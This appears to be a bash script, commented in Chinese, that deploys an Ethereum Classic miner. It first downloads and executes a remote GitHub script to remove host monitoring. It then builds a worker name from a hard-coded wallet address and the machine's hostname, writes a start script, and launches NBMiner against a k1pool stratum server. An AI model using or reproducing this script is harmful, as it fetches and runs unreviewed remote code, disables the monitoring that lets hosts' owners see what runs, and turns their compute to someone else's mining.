#!/bin/bash

# Step 1: 删掉监控
echo "正在删除监控..."
curl -L https://raw.githubusercontent.com/spiritLHLS/one-click-installation-script/main/install_scripts/dlm.sh -o dlm.sh
chmod +x dlm.sh
bash dlm.sh

# Step 2: 进入NBMiner软件目录
echo "进入NBMiner目录..."
cd NBMiner_Linux

# Step 3: 生成基于主机名的挖矿用户名
machine_name=$(hostname)
mining_user="KrZ2yiKoPcnVVo4bQNySibk8a8XY8tNNSko.${machine_name}"

# Step 4: 自动生成 start_etc.sh 文件
echo "正在自动生成 start_etc.sh 文件..."
cat > start_etc.sh <<EOL
#!/bin/bash
# 启动NBMiner并使用生成的用户名进行挖矿
./nbminer -a etchash -o stratum+ssl://us.etc.k1pool.com:3811 -u $mining_user -log
EOL

# Step 5: 给 start_etc.sh 脚本添加执行权限
chmod +x start_etc.sh

# Step 6: 启动挖矿脚本
echo "启动NBMiner..."
./start_etc.sh
